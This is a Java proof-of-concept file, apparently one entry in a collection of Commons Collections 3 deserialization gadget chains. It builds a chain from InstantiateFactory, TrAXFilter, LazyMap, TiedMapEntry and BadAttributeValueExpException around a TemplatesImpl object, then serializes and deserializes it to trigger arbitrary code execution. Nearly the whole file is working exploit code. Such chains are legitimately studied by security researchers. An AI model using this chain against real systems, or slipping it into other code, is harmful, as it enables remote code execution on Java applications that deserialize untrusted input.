package com.example.CC3;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.Map;

public class POC_25 {

    public static void main(String[] args) throws Exception {
        InstantiateFactory factory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{Share.getTemplatesImplObj()});
        FactoryTransformer factoryTransformer = new FactoryTransformer(factory);

        Map lazyMap = LazyMap.decorate(new HashMap(), factoryTransformer);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");

        BadAttributeValueExpException exception = new BadAttributeValueExpException("1");
        ReflectionUtil.setField(exception, "val", entry);

        SerializeUtil.deserialize(SerializeUtil.serialize(exception));
    }

}
